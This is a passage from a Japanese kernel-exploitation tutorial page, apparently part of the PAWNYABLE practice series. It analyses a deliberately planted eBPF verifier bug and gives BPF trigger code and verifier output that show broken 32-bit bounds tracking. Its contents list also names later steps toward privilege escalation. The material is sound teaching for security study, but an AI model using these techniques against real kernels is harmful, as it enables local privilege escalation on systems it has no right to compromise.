<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta name="og:url" content="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">

    <meta name="og:title" content="eBPFのバグの悪用 - PAWNYABLE!">

<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
<meta name="og:description" content="もふもふpwnワールド">
<meta name="og:type" content="website">
<meta name="og:site_name" content="PAWNYABLE!">

<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="ptr-yudai">







<title>eBPFのバグの悪用 | PAWNYABLE!</title>



    <link rel="icon" href="/favicon.png">



<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
</style>



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    




    <!-- scripts list from _config.yml -->
    
    <script src="/js/frame.js"></script>
    







  <style type="text/css">
.spoiler {
  display: inline-flex;
}
p.spoiler {
  display: flex;
}
.spoiler a {
  pointer-events: none;
}
.spoiler-blur, .spoiler-blur > * {
  transition: text-shadow .5s ease;
}
.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
  color: rgba(0, 0, 0, 0);
  background-color: rgba(0, 0, 0, 0);
  text-shadow: 0 0 10px grey;
  cursor: pointer;
}
.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
  text-shadow: 0 0 5px grey;
}
.spoiler-box, .spoiler-box > * {
  transition: color .5s ease,
  background-color .5s ease;
}
.spoiler .spoiler-box, .spoiler .spoiler-box > * {
  color: black;
  background-color: black;
  text-shadow: none;
}</style><meta name="generator" content="Hexo 5.4.2"></head>
  <body>
    <div class="mask-border">
    </div>

    <div class="wrapper">

      <div class="header">
  <div class="flex-container">
    <div class="header-inner">
      <div class="site-brand-container">
        <a href="/">PAWNYABLE</a>
      </div>
      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
        Menu
      </div>
      <nav class="site-nav">
        <ul class="menu-list">
          
            
              <li class="menu-item">
                <a href="/practice/">Practice</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/about/">About</a>
              </li> 
                   
          
        </ul>
      </nav>
    </div>
  </div>
</div>


      <div class="main">
        <div class="flex-container">
          <article id="post">

  
    <div class="post-head">
    <div class="post-info">
        <div class="post-title">
            
            
                eBPFのバグの悪用
            
            
        </div>
    </div>
    <div class="h-line-primary"></div>
    
        <div class="pagination">
            <div class="pagination-bk"><a href="verifier.html">前のページへ</a></div>
            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
            <div class="pagination-fd"></div>
        </div>
    
</div>

    <div class="post-content">
    <p>この章では、eBPFの中でも検証器のバグを悪用して権限昇格に挑戦します。まずは、<a href="distfiles/LK06.tar.gz">LK06 (Brahman)</a>の配布ファイルを用意してください。</p>
<div class="column" title="目次">
<!-- toc -->
<ul>
<li><a href="#------">パッチの確認</a>
<ul>
<li><a href="#-scalar32-min-max-or----"><code>scalar32_min_max_or</code>を読む</a></li>
<li><a href="#---update-reg32-bounds----"><code>__update_reg32_bounds</code>を読む</a></li>
<li><a href="#-----">バグの再現</a></li>
</ul>
</li>
<li><a href="#-------">アドレスリーク</a></li>
<li><a href="#-----">範囲外参照</a>
<ul>
<li><a href="#-----------">追跡が壊れた定数の作成</a></li>
<li><a href="#--------">範囲外参照の確認</a></li>
</ul>
</li>
<li><a href="#alu-sanitation---">ALU sanitationの回避</a></li>
<li><a href="#aar-aaw---">AAR/AAWの作成</a></li>
<li><a href="#kaslr--------">kASLRの回避と権限昇格</a></li>
</ul>
<!-- tocstop -->
<br>
</div>
<h2 id="パッチの確認">パッチの確認</h2>
<p>今回は練習用にeBPFを脆弱にするため、検証器に対してバグを埋め込むパッチが適用されています。<code>patch/verifier.diff</code>にその内容があるので、確認してみましょう。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7957c7957,7958</span><br><span class="line">&lt;               __mark_reg32_known(dst_reg, var32_off.value);</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;               // `scalar_min_max_or` will handler the case</span><br><span class="line">&gt;               //__mark_reg32_known(dst_reg, var32_off.value);</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7957"><code>kernel/bpf/verifier.c</code></a>の7957行目<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>に変更が入っています。</p>
<p><code>scalar32_min_max_or</code>関数の冒頭で<code>__mark_reg32_known</code>という関数が呼ばれていますが、パッチ適用後はコメントアウトされています。それ以外の変更はないので、この部分を詳しく見ていきましょう。</p>
<h3 id="scalar32-min-max-orを読む"><code>scalar32_min_max_or</code>を読む</h3>
<p>変更が入っている<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7957"><code>scalar32_min_max_or</code></a>の呼び出し元は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L8374"><code>adjust_scalar_min_max_vals</code></a>です。この関数では、ADDやXORなどのALU演算後の宛先レジスタの範囲追跡を実装しています。<br>
修正が入っているのは<code>BPF_OR</code>です。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">	dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">	scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">	scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>まず、<code>tnum_or</code>で宛先レジスタの<code>var_off</code>を更新しています。実装は単純で、ORするビットの両方が不明であれば、宛先も不明とします。片方のビットが不明な時でも、もう片方が1であればORした結果も必ず1になるため、maskの対応するビットは0になります。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> tnum <span class="title function_">tnum_or</span><span class="params">(<span class="keyword">struct</span> tnum a, <span class="keyword">struct</span> tnum b)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 v, mu;</span><br><span class="line"></span><br><span class="line">	v = a.value | b.value;</span><br><span class="line">	mu = a.mask | b.mask;</span><br><span class="line">	<span class="keyword">return</span> TNUM(v, mu &amp; ~v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例えば<code>(mask=0xffff0000; value=0x1001)</code>と<code>(mask=0xffffff00; value=0x2)</code>をORすると、<code>(mask=0xffffef00; value=0x1003)</code>になります。</p>
<p><code>var_off</code>を更新したら、問題の<code>scalar32_min_max_or</code>が呼ばれます。削除されている箇所は<code>src_known</code>, <code>dst_known</code>がtrueのときに到達します。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	<span class="type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">        <span class="comment">// `scalar_min_max_or` will handler the case</span></span><br><span class="line">		<span class="comment">//__mark_reg32_known(dst_reg, var32_off.value);</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>tnum_subreg_is_const</code>は、レジスタの下位32ビット部分が定数のときにtrueを返します。つまり、ORするレジスタの両方とも下位32ビットが定数のとき、本来は<code>__mark_reg32_known</code>が呼ばれるはずでした。<br>
<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L1180"><code>__mark_reg32_known</code></a>は、定数の<code>var_off</code>を使って<code>s32_min_value</code>, <code>s32_max_value</code>, <code>u32_min_value</code>, <code>u32_max_value</code>を更新します。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg32_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const_subreg(reg-&gt;var_off, imm);</span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>パッチ中のコメントに「<code>scalar_min_max_or</code> will handler the case」とあるので、<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7981"><code>scalar_min_max_or</code></a>も追ってみます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar_min_max_or</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">		__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基本的には<code>scalar32_min_max_or</code>の64ビット版です。ここで、両方とも64ビットの値が定数のとき、<code>__mark_reg_known</code>が呼ばれます。<code>__mark_reg_known</code>は、64ビット部分に加えて32ビットの範囲も定数に変更しています。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> ___mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">	reg-&gt;smin_value = (s64)imm;</span><br><span class="line">	reg-&gt;smax_value = (s64)imm;</span><br><span class="line">	reg-&gt;umin_value = imm;</span><br><span class="line">	reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line">	<span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">	       offsetof(<span class="keyword">struct</span> bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">	___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>つまり、ORの64ビットレジスタが両方とも定数の場合、<code>scalar32_min_max_or</code>で<code>__mark_reg32_known</code>を呼ばなくても、後の<code>scalar_min_max_or</code>で問題なく定数になるという仕組みです。</p>
<p>では、64ビットレジスタの上位32ビットが定数でない場合はどうでしょうか。<code>scalar32_min_max_or</code>は即座にreturnしますが、<code>scalar_min_max_or</code>で<code>__mark_reg_known</code>は呼ばれません。<br>
このとき、<code>scalar_min_max_or</code>中の次のパスに到達します。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We get our maximum from the var_off, and our minimum is the</span></span><br><span class="line"><span class="comment"> * maximum of the operands&#x27; minima</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = max(dst_reg-&gt;umin_value, umin_val);</span><br><span class="line">dst_reg-&gt;umax_value = dst_reg-&gt;var_off.value | dst_reg-&gt;var_off.mask;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">	 * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">	dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">	 * cast result into s64.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">	dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br></pre></td></tr></table></figure>
<p><code>umin_value</code>, <code>umax_value</code>, <code>smin_value</code>, <code>smax_value</code>を更新したあと、<code>__update_reg_bounds</code>が呼ばれます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	__update_reg32_bounds(reg);</span><br><span class="line">	__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>こちらでも32ビット、64ビットともに範囲を更新しています。ということは、パッチは不要な処理を削除しただけでしょうか？</p>
<h3 id="update-reg32-boundsを読む"><code>__update_reg32_bounds</code>を読む</h3>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L1298"><code>__update_reg32_bounds</code></a>の処理をよく見てみましょう。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg32_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;s32_min_value = <span class="type">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;s32_max_value = <span class="type">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">	reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">	reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">				 (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__mark_reg32_known</code>が呼ばれていないため、32ビットのmin, maxは古い状態のままです。これを利用して更新されるmin, maxに不整合を起こせないでしょうか。簡単のために符号なしの場合を考えます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">			 (u32)(var32_off.value | var32_off.mask));</span><br></pre></td></tr></table></figure>
<p>今、レジスタの下位32ビットはsrc, dstともに定数です。そのため、<code>var32_off.mask</code>は0で、次のように書き直せます。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(reg-&gt;u32_min_value, var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value, var32_off.value);</span><br></pre></td></tr></table></figure>
<p><code>u32_min_value</code>と<code>u32_max_value</code>は宛先レジスタの元の状態が引き継がれています。下位32ビットは定数である必要があるので、元の<code>u32_min_value</code>と<code>u32_max_value</code>はともにXという値だったとします。これに対して何かしらの定数YをORして、結果が<code>X|Y</code>になります。すると、<code>X|Y &gt; X</code>のとき、</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(X, X|Y); <span class="comment">// min=X|Y</span></span><br><span class="line">reg-&gt;u32_max_value = min(X, X|Y); <span class="comment">// max=X</span></span><br></pre></td></tr></table></figure>
<p>となり、<code>u32_min_value</code>が<code>u32_max_value</code>よりも大きくなるという不整合が起きます。</p>
<h3 id="バグの再現">バグの再現</h3>
<p>簡単のためにX=0, Y=1として考えましょう。<br>
まず、次のようなレジスタR1, R2を用意します。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1: var_off=(value=0; mask=0xffffffff00000000)</span><br><span class="line">R2: var_off=(value=0xfffffffe00000001; mask=0)</span><br></pre></td></tr></table></figure>
<p>これを<code>BPF_OR(R1, R2)</code>でORした際の変化を見てみましょう。</p>
<ol>
<li><code>var_off=(value=0xfffffffe00000001; mask=0x100000000)</code></li>
<li><code>u32_min_value = max(0, 1) = 1</code></li>
<li><code>u32_max_value = min(0, 1) = 0</code></li>
</ol>
<p>これにより、32ビット部分の最小値が1、最大値が0という壊れたレジスタができます。実際にコードで確認しましょう。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BPFマップを作成</span></span><br><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPFプログラム */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">  <span class="comment">// R0 --&gt; &amp;map[0]</span></span><br><span class="line">  BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">  BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">  BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">  BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">  BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">  BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">  BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">  BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">  BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">  BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">  BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>このプログラムをロードし、検証器のログ<code>verifier_log</code>を出力してみてください。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./pwn </span><br><span class="line">func#0 @0</span><br><span class="line">0: R1=ctx(off=0,imm=0) R10=fp0</span><br><span class="line">0: (7a) *(u64 *)(r10 -8) = 0          ; R10=fp0 fp-8_w=mmmmmmmm</span><br><span class="line">1: (18) r1 = 0x0                      ; R1_w=map_ptr(off=0,ks=4,vs=8,imm=0)</span><br><span class="line">3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0</span><br><span class="line">4: (07) r2 += -8                      ; R2_w=fp-8</span><br><span class="line">5: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)</span><br><span class="line">6: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0</span><br><span class="line">7: (95) exit</span><br><span class="line"></span><br><span class="line">from 6 to 8: R0=map_value(off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8=mmmmmmmm</span><br><span class="line">8: (79) r1 = *(u64 *)(r0 +0)          ; R0=map_value(off=0,ks=4,vs=8,imm=0) R1_w=Pscalar()</span><br><span class="line">9: (77) r1 &gt;&gt;= 32                     ; R1_w=Pscalar(umax=4294967295,var_off=(0x0; 0xffffffff))</span><br><span class="line">10: (67) r1 &lt;&lt;= 32                    ; R1_w=Pscalar(smax=9223372032559808512,umax=18446744069414584320,var_off=(0x0; 0xffffffff00000000),s32_min=0,s32_max=0,u32_max=0)</span><br><span class="line">11: (b7) r2 = -2                      ; R2_w=P-2</span><br><span class="line">12: (67) r2 &lt;&lt;= 32                    ; R2_w=P-8589934592</span><br><span class="line">13: (07) r2 += 1                      ; R2_w=P-8589934591</span><br><span class="line">14: (4f) r1 |= r2                     ; R1_w=Pscalar(umin=18446744065119617025,umax=18446744069414584321,var_off=(0xfffffffe00000001; 0x100000000),s32_min=1,s32_max=0,u32_min=1,u32_max=0) R2_w=P-85891</span><br><span class="line">15: (b7) r0 = 0                       ; R0_w=P0</span><br><span class="line">16: (95) exit</span><br><span class="line">processed 16 insns (limit 1000000) max_states_per_insn 0 total_states 1 peak_states 1 mark_read 1</span><br></pre></td></tr></table></figure>
<p>14個目のOR命令で</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1_w=Pscalar(...,s32_min=1,s32_max=0,u32_min=1,u32_max=0)</span><br></pre></td></tr></table></figure>
<p>と、範囲追跡が壊れていることが分かります。</p>
<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="オオカミくん" ></div>
  <p class="says">
    このバグは実際にOR, AND, XOR命令で<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank">過去に存在していたもの</a>だよ。</a>
  </p>
</div>
<h2 id="アドレスリーク-2">アドレスリーク</h2>
<p>今回のように、<code>min_value &gt; max_value</code>という条件ができた場合、それを悪用する方法はいくつかあります。まずはマップのアドレスリークに使ってみましょう。<br>
eBPFではポインタに対するスカラー値の加減算が許可されています。ポインタとスカラー値の演算におけるオフセットのアップデートは、<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7480"><code>adjust_ptr_min_max_vals</code></a>に実装されています。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_ptr_min_max_vals</span><span class="params">(<span 